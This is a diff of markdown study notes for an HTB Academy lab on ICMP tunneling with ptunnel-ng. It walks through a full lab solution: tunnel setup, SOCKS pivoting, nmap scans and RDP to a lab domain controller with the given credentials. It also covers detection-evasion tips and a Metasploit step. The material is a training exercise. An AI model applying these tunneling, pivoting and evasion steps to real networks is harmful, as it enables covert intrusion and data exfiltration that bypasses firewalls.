@@ -1,25 +1,27 @@
-# **ICMP Tunneling with SOCKS - HTB Academy Page 14**
+# 📡 ICMP Tunneling with ptunnel-ng
 
 ## **📋 Module Overview**
 
-**Purpose:** Traffic encapsulation within ICMP echo requests/responses  
-**Tool:** ptunnel-ng - ICMP tunnel implementation  
-**Protocol:** ICMP (Internet Control Message Protocol)  
-**Advantage:** Bypasses firewalls that allow ping, stealth communication  
-**Use Case:** Data exfiltration, covert channels, firewall bypass  
+**Purpose:** Traffic encapsulation within ICMP echo requests/responses\
+**Tool:** ptunnel-ng - ICMP tunnel implementation\
+**Protocol:** ICMP (Internet Control Message Protocol)\
+**Advantage:** Bypasses firewalls that allow ping, stealth communication\
+**Use Case:** Data exfiltration, covert channels, firewall bypass
 
----
+***
 
 ## **1. Introduction to ICMP Tunneling**
 
 ### **What is ICMP Tunneling?**
-- **Protocol:** Uses ICMP echo requests and responses for data transmission
-- **Encapsulation:** Traffic hidden within ping packets
-- **Stealth:** Appears as legitimate network diagnostics
-- **Firewall Bypass:** Works when ping is allowed outbound
-- **Bidirectional:** Full communication channel support
+
+* **Protocol:** Uses ICMP echo requests and responses for data transmission
+* **Encapsulation:** Traffic hidden within ping packets
+* **Stealth:** Appears as legitimate network diagnostics
+* **Firewall Bypass:** Works when ping is allowed outbound
+* **Bidirectional:** Full communication channel support
 
 ### **How ICMP Tunneling Works**
+
 ```
 [Internal Host] → [Firewall] → [External Server]
 ICMP Echo Req     Allows Ping    ptunnel-ng Server
@@ -28,6 +30,7 @@ SSH/TCP Traffic   Passes Through  Forwards to Target
 ```
 
 ### **ICMP Tunneling Use Cases**
+
 1. **Restrictive Firewalls** - only ICMP allowed outbound
 2. **Data Exfiltration** - covert data transmission
 3. **Command & Control** - stealth C2 channels
@@ -36,28 +39,30 @@ SSH/TCP Traffic   Passes Through  Forwards to Target
 
 ### **ICMP vs Other Tunneling Protocols**
 
-| **Aspect** | **ICMP** | **DNS** | **HTTP** | **SSH** |
-|------------|----------|---------|----------|---------|
-| **Stealth** | Very High | High | Medium | Low |
-| **Firewall Bypass** | Excellent | Excellent | Good | Limited |
-| **Performance** | Low | Low | Medium | High |
-| **Setup Complexity** | Medium | Medium | Low | Low |
-| **Detection Difficulty** | Hard | Hard | Medium | Easy |
-| **Payload Size** | Small | Small | Large | Large |
+| **Aspect**               | **ICMP**  | **DNS**   | **HTTP** | **SSH** |
+| ------------------------ | --------- | --------- | -------- | ------- |
+| **Stealth**              | Very High | High      | Medium   | Low     |
+| **Firewall Bypass**      | Excellent | Excellent | Good     | Limited |
+| **Performance**          | Low       | Low       | Medium   | High    |
+| **Setup Complexity**     | Medium    | Medium    | Low      | Low     |
+| **Detection Difficulty** | Hard      | Hard      | Medium   | Easy    |
+| **Payload Size**         | Small     | Small     | Large    | Large   |
 
----
+***
 
 ## **2. ptunnel-ng Overview**
 
 ### **What is ptunnel-ng?**
-- **Evolution:** Next generation of original ptunnel
-- **Language:** C implementation
-- **Platform:** Linux/Unix systems
-- **Features:** ICMP tunneling with TCP forwarding
-- **Modes:** Client-server architecture
-- **Security:** Basic authentication support
+
+* **Evolution:** Next generation of original ptunnel
+* **Language:** C implementation
+* **Platform:** Linux/Unix systems
+* **Features:** ICMP tunneling with TCP forwarding
+* **Modes:** Client-server architecture
+* **Security:** Basic authentication support
 
 ### **ptunnel-ng Architecture**
+
 ```
 [Attack Host] ←ICMP→ [Pivot Host] ←TCP→ [Target Services]
 ptunnel Client      ptunnel Server      SSH, RDP, etc.
@@ -66,19 +71,21 @@ TCP to ICMP         ICMP to TCP         172.16.5.0/23
 ```
 
 ### **Key Features**
-- **Protocol Translation** - TCP to ICMP conversion
-- **Port Forwarding** - local port to remote service
-- **Session Management** - multiple concurrent tunnels
-- **Statistics** - traffic monitoring and analysis
-- **Privilege Management** - drops privileges after setup
 
----
+* **Protocol Translation** - TCP to ICMP conversion
+* **Port Forwarding** - local port to remote service
+* **Session Management** - multiple concurrent tunnels
+* **Statistics** - traffic monitoring and analysis
+* **Privilege Management** - drops privileges after setup
+
+***
 
 ## **3. Installation and Setup**
 
 ### **Method 1: Git Clone and Build**
 
 #### **Clone Repository**
+
 ```bash
 # Clone ptunnel-ng from GitHub
 git clone https://github.com/utoni/ptunnel-ng.git
@@ -90,6 +97,7 @@ ls -la
 ```
 
 #### **Install Build Dependencies**
+
 ```bash
 # Install required build tools
 sudo apt update
@@ -100,6 +108,7 @@ sudo apt install libc6-dev-i386
 ```
 
 #### **Compile Standard Binary**
+
 ```bash
 # Run autogen script to configure and build
 sudo ./autogen.sh
@@ -117,6 +126,7 @@ ls -la src/ptunnel-ng
 ```
 
 #### **Compile Static Binary (Recommended)**
+
 ```bash
 # Create static binary for better portability
 sudo apt install automake autoconf -y
@@ -133,9 +143,10 @@ file src/ptunnel-ng
 # Should show: statically linked
 ```
 
-### **Method 2: Cross-Compilation for x86_64**
+### **Method 2: Cross-Compilation for x86\_64**
 
 #### **For ARM64 Host (M1/M2 Kali)**
+
 ```bash
 # Install cross-compiler
 sudo apt install gcc-x86-64-linux-gnu
@@ -153,6 +164,7 @@ file src/ptunnel-ng
 ```
 
 ### **Architecture Compatibility Issues**
+
 ```bash
 # Common problem: ARM binary on x86_64 target
 # Error: ./ptunnel-ng: 1: @@l@8: not found
@@ -163,13 +175,14 @@ file src/ptunnel-ng
 # x86_64 Kali → x86_64 Ubuntu = direct compile works
 ```
 
----
+***
 
 ## **4. Server Setup (Pivot Host)**
 
 ### **Transfer Binary to Pivot Host**
 
 #### **Method 1: SCP Transfer**
+
 ```bash
 # Transfer entire repository
 scp -r ptunnel-ng ubuntu@10.129.202.64:~/
@@ -179,6 +192,7 @@ scp ptunnel-ng/src/ptunnel-ng ubuntu@10.129.202.64:~/
 ```
 
 #### **Method 2: Compile on Target**
+
 ```bash
 # SSH to target and compile locally (avoids arch issues)
 ssh ubuntu@10.129.202.64
@@ -196,6 +210,7 @@ sudo ./autogen.sh
 ### **Start ptunnel-ng Server**
 
 #### **Basic Server Configuration**
+
 ```bash
 # Start server on pivot host
 ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
@@ -211,6 +226,7 @@ ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
 ```
 
 #### **Server Parameters Explanation**
+
 ```bash
 # Command breakdown:
 sudo ./ptunnel-ng -r10.129.202.64 -R22
@@ -221,6 +237,7 @@ sudo ./ptunnel-ng -r10.129.202.64 -R22
 ```
 
 #### **Common Server Issues**
+
 ```bash
 # Problem: libselinux warning
 ./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available
@@ -234,13 +251,14 @@ sudo ./ptunnel-ng -r10.129.202.64 -R22
 sudo ./ptunnel-ng -r10.129.202.64 -R22
 ```
 
----
+***
 
 ## **5. Client Setup (Attack Host)**
 
 ### **Connect to ptunnel-ng Server**
 
 #### **Basic Client Connection**
+
 ```bash
 # Connect from attack host to server
 sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
@@ -254,6 +272,7 @@ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
 ```
 
 #### **Client Parameters Explanation**
+
 ```bash
 # Command breakdown:
 sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
@@ -267,6 +286,7 @@ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
 ### **Test ICMP Tunnel**
 
 #### **SSH Through ICMP Tunnel**
+
 ```bash
 # Connect via local port 2222 (tunneled through ICMP)
 ssh -p2222 -lubuntu 127.0.0.1
@@ -278,6 +298,7 @@ ubuntu@WEB01:~$
 ```
 
 #### **Verify Tunnel Statistics**
+
 ```bash
 # Server side shows session statistics:
 [inf]: Incoming tunnel request from 10.10.14.18.
@@ -288,13 +309,14 @@ Session statistics:
 [inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
 ```
 
----
+***
 
 ## **6. Advanced Usage - Dynamic Port Forwarding**
 
 ### **SSH Dynamic Port Forwarding**
 
 #### **Setup SOCKS Proxy Through ICMP**
+
 ```bash
 # Establish dynamic port forwarding over ICMP tunnel
 ssh -D 9050 -p2222 -lubuntu 127.0.0.1
@@ -304,6 +326,7 @@ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
 ```
 
 #### **Configure Proxychains**
+
 ```bash
 # Edit proxychains configuration
 sudo nano /etc/proxychains4.conf
@@ -319,6 +342,7 @@ tail -5 /etc/proxychains4.conf
 ### **Network Scanning Through ICMP Tunnel**
 
 #### **Proxychains + Nmap**
+
 ```bash
 # Scan internal network through ICMP tunnel
 proxychains nmap -sV -sT 172.16.5.19 -p3389
@@ -335,6 +359,7 @@ PORT     STATE SERVICE       VERSION
 ```
 
 #### **Service Enumeration**
+
 ```bash
 # Comprehensive port scan through tunnel
 proxychains nmap -sT -Pn 172.16.5.0/24
@@ -346,23 +371,26 @@ proxychains nmap -sV -sT -p 80,443,3389,5985 172.16.5.19
 proxychains nmap -sC -sV -p 3389 172.16.5.19
 ```
 
----
+***
 
 ## **7. HTB Academy Lab Exercise**
 
 ### **Lab Challenge**
+
 **"Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer."**
 
 ### **Lab Environment**
-- **Target SSH:** 10.129.202.64 with credentials `ubuntu:HTB_@cademy_stdnt!`
-- **Internal Network:** 172.16.5.0/23
-- **Domain Controller:** 172.16.5.19
-- **DC Credentials:** `victor:pass@123`
-- **Flag Location:** `C:\Users\victor\Downloads\flag.txt`
+
+* **Target SSH:** 10.129.202.64 with credentials `ubuntu:HTB_@cademy_stdnt!`
+* **Internal Network:** 172.16.5.0/23
+* **Domain Controller:** 172.16.5.19
+* **DC Credentials:** `victor:pass@123`
+* **Flag Location:** `C:\Users\victor\Downloads\flag.txt`
 
 ### **Complete Lab Solution**
 
 #### **Step 1: Setup ptunnel-ng on Attack Host**
+
 ```bash
 # Clone and build ptunnel-ng
 git clone https://github.com/utoni/ptunnel-ng.git
@@ -381,6 +409,7 @@ ls -la src/ptunnel-ng
 ```
 
 #### **Step 2: Transfer to Pivot Host**
+
 ```bash
 # Transfer repository to target
 scp -r ptunnel-ng ubuntu@10.129.202.64:~/
@@ -395,6 +424,7 @@ sudo ./autogen.sh
 ```
 
 #### **Step 3: Start Server on Pivot Host**
+
 ```bash
 # SSH to pivot host
 ssh ubuntu@10.129.202.64
@@ -412,6 +442,7 @@ sudo ./ptunnel-ng -r10.129.202.64 -R22
 ```
 
 #### **Step 4: Connect Client from Attack Host**
+
 ```bash
 # Start ptunnel-ng client (new terminal on attack host)
 cd ptunnel-ng/src/
@@ -423,6 +454,7 @@ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
 ```
 
 #### **Step 5: Test ICMP Tunnel**
+
 ```bash
 # Test SSH connection through ICMP tunnel
 ssh -p2222 -lubuntu 127.0.0.1
@@ -434,6 +466,7 @@ ubuntu@WEB01:~$
 ```
 
 #### **Step 6: Setup Dynamic Port Forwarding**
+
 ```bash
 # Establish SOCKS proxy through ICMP tunnel
 ssh -D 9050 -p2222 -lubuntu 127.0.0.1
@@ -442,6 +475,7 @@ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
 ```
 
 #### **Step 7: Configure Proxychains**
+
 ```bash
 # Edit proxychains configuration (new terminal)
 sudo nano /etc/proxychains4.conf
@@ -455,6 +489,7 @@ tail -5 /etc/proxychains4.conf
 ```
 
 #### **Step 8: Scan Internal Network**
+
 ```bash
 # Scan Domain Controller through ICMP tunnel
 proxychains nmap -sT -Pn 172.16.5.19 -p 3389
@@ -465,6 +500,7 @@ PORT     STATE SERVICE
 ```
 
 #### **Step 9: RDP to Domain Controller**
+
 ```bash
 # RDP through ICMP tunnel to DC
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
@@ -473,6 +509,7 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
 ```
 
 #### **Step 10: Retrieve Flag**
+
 ```cmd
 # In RDP session, open Command Prompt
 # Navigate to Downloads folder
@@ -488,6 +525,7 @@ type flag.txt
 ```
 
 #### **Lab Solution Summary**
+
 ```bash
 # Attack Host - Terminal 1: Setup
 git clone https://github.com/utoni/ptunnel-ng.git
@@ -510,13 +548,14 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
 # In RDP: type C:\Users\victor\Downloads\flag.txt
 ```
 
----
+***
 
 ## **8. Network Traffic Analysis**
 
 ### **Wireshark Analysis**
 
 #### **Normal SSH Traffic**
+
 ```bash
 # Command: ssh ubuntu@10.129.202.64
 # Wireshark shows:
@@ -527,6 +566,7 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
 ```
 
 #### **ICMP Tunneled SSH Traffic**
+
 ```bash
 # Command: ssh -p2222 -lubuntu 127.0.0.1
 # Wireshark shows:
@@ -538,6 +578,7 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
 ```
 
 ### **Traffic Characteristics**
+
 ```bash
 # ICMP tunnel characteristics:
 - Type: ICMP (Protocol 1)
@@ -549,6 +590,7 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
 ```
 
 ### **Detection Signatures**
+
 ```bash
 # Potential detection indicators:
 1. Large ICMP payload sizes
@@ -558,13 +600,14 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
 5. Payload entropy analysis (encrypted data)
 ```
 
----
+***
 
 ## **9. Troubleshooting**
 
 ### **Common Issues**
 
 #### **Architecture Mismatch**
+
 ```bash
 # Problem: Binary won't execute on target
 ./ptunnel-ng: 1: @@l@8: not found
@@ -585,6 +628,7 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
 ```
 
 #### **Permission Issues**
+
 ```bash
 # Problem: ICMP socket creation fails
 [err]: Could not create ICMP socket: Operation not permitted
@@ -601,6 +645,7 @@ sudo chmod 4755 ptunnel-ng
 ```
 
 #### **Connection Issues**
+
 ```bash
 # Problem: No ICMP responses
 [inf]: No response from target
@@ -617,6 +662,7 @@ sudo chmod 4755 ptunnel-ng
 ```
 
 #### **Performance Issues**
+
 ```bash
 # Problem: Slow tunnel performance
 # ICMP has inherent limitations
@@ -632,11 +678,12 @@ sudo chmod 4755 ptunnel-ng
    ssh -C -p2222 -lubuntu 127.0.0.1
 ```
 
----
+***
 
 ## **10. Operational Security (OPSEC)**
 
 ### **Stealth Considerations**
+
 1. **Traffic Appearance** - looks like diagnostic ping traffic
 2. **Payload Size** - unusual ICMP payload sizes may trigger alerts
 3. **Frequency** - high-frequency pings may be suspicious
@@ -644,6 +691,7 @@ sudo chmod 4755 ptunnel-ng
 5. **Destination** - multiple ICMP flows to same target
 
 ### **Detection Evasion**
+
 ```bash
 # Use irregular timing patterns
 # Avoid sustained high-volume traffic
@@ -653,6 +701,7 @@ sudo chmod 4755 ptunnel-ng
 ```
 
 ### **Network Monitoring Evasion**
+
 ```bash
 # Techniques to avoid detection:
 1. Rate limiting - space out ICMP packets
@@ -662,11 +711,12 @@ sudo chmod 4755 ptunnel-ng
 5. Traffic mixing - blend with legitimate pings
 ```
 
----
+***
 
 ## **11. Integration with Other Techniques**
 
 ### **Multi-hop ICMP Tunneling**
+
 ```bash
 # Chain multiple ICMP tunnels
 [Attack] → ICMP → [Pivot1] → ICMP → [Pivot2] → [Target]
@@ -677,6 +727,7 @@ sudo chmod 4755 ptunnel-ng
 ```
 
 ### **ICMP + SSH Port Forwarding**
+
 ```bash
 # Combine ICMP tunnel with SSH forwarding
 ssh -L 8080:172.16.5.19:80 -p2222 -lubuntu 127.0.0.1
@@ -686,6 +737,7 @@ curl http://127.0.0.1:8080
 ```
 
 ### **ICMP + Metasploit**
+
 ```bash
 # Use ICMP tunnel for Metasploit payloads
 # Setup SOCKS proxy through ICMP
@@ -700,41 +752,43 @@ set RHOSTS 172.16.5.19
 exploit
 ```
 
----
+***
 
 ## **12. Alternative ICMP Tunneling Tools**
 
 ### **Tool Comparison**
 
-| **Tool** | **Language** | **Features** | **Platform** | **Stealth** |
-|----------|--------------|--------------|--------------|-------------|
-| **ptunnel-ng** | C | TCP forwarding | Linux/Unix | High |
-| **icmptunnel** | Python | Raw ICMP | Cross-platform | High |
-| **ICMP-TransferTools** | PowerShell | File transfer | Windows | Medium |
-| **pingfs** | C | Filesystem over ICMP | Linux | Very High |
-| **ICMPDoor** | C | ICMP backdoor | Linux/Windows | High |
+| **Tool**               | **Language** | **Features**         | **Platform**   | **Stealth** |
+| ---------------------- | ------------ | -------------------- | -------------- | ----------- |
+| **ptunnel-ng**         | C            | TCP forwarding       | Linux/Unix     | High        |
+| **icmptunnel**         | Python       | Raw ICMP             | Cross-platform | High        |
+| **ICMP-TransferTools** | PowerShell   | File transfer        | Windows        | Medium      |
+| **pingfs**             | C            | Filesystem over ICMP | Linux          | Very High   |
+| **ICMPDoor**           | C            | ICMP backdoor        | Linux/Windows  | High        |
 
 ### **When to Use ICMP Tunneling**
-✅ **Restrictive firewall environments**  
-✅ **Only ICMP allowed outbound**  
-✅ **Stealth communication required**  
-✅ **Data exfiltration scenarios**  
-✅ **Security testing engagements**  
+
+✅ **Restrictive firewall environments**\
+✅ **Only ICMP allowed outbound**\
+✅ **Stealth communication required**\
+✅ **Data exfiltration scenarios**\
+✅ **Security testing engagements**
 
 ### **Limitations**
-❌ **Low bandwidth performance**  
-❌ **High latency connections**  
-❌ **Small payload size restrictions**  
-❌ **Deep packet inspection environments**  
-❌ **ICMP rate limiting policies**  
 
----
+❌ **Low bandwidth performance**\
+❌ **High latency connections**\
+❌ **Small payload size restrictions**\
+❌ **Deep packet inspection environments**\
+❌ **ICMP rate limiting policies**
+
+***
 
 ## **References**
 
-- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 14
-- **ptunnel-ng GitHub**: [Official Repository](https://github.com/utoni/ptunnel-ng)
-- **Original ptunnel**: [Legacy Implementation](http://www.cs.uit.no/~daniels/PingTunnel/)
-- **ICMP RFC**: [RFC 792 - Internet Control Message Protocol](https://tools.ietf.org/html/rfc792)
-- **Network Tunneling**: [SANS Tunneling Guide](https://www.sans.org/reading-room/whitepapers/protocols/tunneling-protocols-security-issues-1674)
-- **Covert Channels**: [ICMP Covert Channel Analysis](https://www.symantec.com/connect/articles/icmp-covert-channel-analysis) 
+* **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 14
+* **ptunnel-ng GitHub**: [Official Repository](https://github.com/utoni/ptunnel-ng)
+* **Original ptunnel**: [Legacy Implementation](http://www.cs.uit.no/~daniels/PingTunnel/)
+* **ICMP RFC**: [RFC 792 - Internet Control Message Protocol](https://tools.ietf.org/html/rfc792)
+* **Network Tunneling**: [SANS Tunneling Guide](https://www.sans.org/reading-room/whitepapers/protocols/tunneling-protocols-security-issues-1674)
+* **Covert Channels**: [ICMP Covert Channel Analysis](https://www.symantec.com/connect/articles/icmp-covert-channel-analysis)
